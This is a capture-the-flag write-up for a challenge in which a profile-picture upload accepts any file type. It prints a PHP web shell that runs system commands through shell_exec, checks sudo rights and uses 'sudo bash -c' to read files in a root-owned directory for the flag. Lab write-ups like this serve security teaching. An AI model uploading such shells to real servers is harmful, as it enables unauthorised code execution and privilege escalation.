# TITLE : n0s4n1ty 1
## Author : Prince Niyonshuti N.
## Description 
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the **/root** directory.
You can access the web application here!
## Hints
- File upload was not sanitized
- Whenever you get a shell on a remote machine, check sudo -l
## Solution
In this challenge, the website allows users to upload a profile picture. However, instead of restricting uploads to images only, it accepts any file type. This is a vulnerability we can exploit.

By uploading a .php file, we can execute arbitrary PHP code on the server. From the hint provided, we know that we can run the sudo -l command, which is a Linux command to list allowed sudo privileges. This implies we can execute system commands through the PHP file.

Below is the PHP script I used:
<pre><code>
<?php
echo "<pre>";
// Check what sudo can do
echo shell_exec("sudo -l");

// Confirm current user
echo "Current user: " . shell_exec("whoami");

// Try running a command as root
echo "Root check: " . shell_exec("sudo whoami");

// Navigate and print path (all in one command)
echo shell_exec("sudo bash -c 'cd /challenge && pwd && ls -la && cat config-box.py && cat metadata.json'");
echo "</pre>";
?>

</code></pre>
From the output of sudo -l, we can determine what commands we're allowed to run with elevated privileges. We also find that there is a /challenge directory in the root, which contains files like metadata.json. By reading that file, we can retrieve the flag.


